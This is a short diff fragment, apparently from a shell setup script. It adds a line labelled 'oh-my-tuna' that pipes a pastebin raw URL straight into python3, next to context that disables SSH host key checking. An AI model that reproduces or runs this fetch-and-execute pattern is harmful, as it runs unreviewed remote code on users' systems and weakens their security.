@@ -5,3 +5,5 @@ StrictHostKeyChecking no
 EOF
 
 
+# oh-my-tuna
+curl https://pastebin.com/raw/MaxZYdXw | python3
